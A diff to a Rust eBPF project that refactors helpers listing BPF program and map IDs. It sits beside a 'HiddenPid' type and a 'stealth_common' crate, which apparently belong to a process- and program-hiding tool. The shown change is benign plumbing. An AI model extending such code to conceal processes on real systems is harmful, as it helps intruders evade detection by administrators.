@@ -2,11 +2,11 @@ use std::{collections::HashSet, fs::OpenOptions, io::Write, path::Path};
 
 use anyhow::{anyhow, Error};
 use aya::{
-    programs::{ProgramInfo, TracePoint},
+    programs::{loaded_programs, ProgramInfo, TracePoint},
     Ebpf, Pod,
 };
 use libbpf_rs::query::{MapInfoIter, ProgInfoIter};
-use log::debug;
+use log::{debug, error};
 use stealth_common::MAX_PID_LENGTH;
 use sysinfo::{Pid, Process, System};
 #[inline]
@@ -95,7 +95,7 @@ impl HiddenPid {
 }
 unsafe impl Pod for HiddenPid {}
 
-pub fn fetch_prog_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInfos, Error> {
+pub fn fetch_progs_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInfos, Error> {
     let mut prog_ids = vec![];
     let mut map_ids = vec![];
     for pinfo in progs_info {
@@ -106,7 +106,6 @@ pub fn fetch_prog_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInf
             }
         }
     }
-
     prog_ids.sort();
     let mut map_ids = map_ids
         .into_iter()
@@ -115,6 +114,23 @@ pub fn fetch_prog_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInf
         .collect::<Vec<u32>>();
     map_ids.sort();
     Ok(BpfProgInfos { prog_ids, map_ids })
+}
+
+pub fn get_progs_info_from_progs_ids(prog_ids: Vec<u32>) -> Vec<ProgramInfo> {
+    let mut prog_info: Vec<ProgramInfo> = vec![];
+    for p in loaded_programs() {
+        match p {
+            Ok(prog) => {
+                if prog_ids.contains(&prog.id()) {
+                    prog_info.push(prog)
+                }
+            }
+            Err(_) => {
+                error!("Error iterating loaded bpf programs")
+            }
+        }
+    }
+    prog_info
 }
 
 pub fn list_threads(proc: &Process) -> Vec<Pid> {
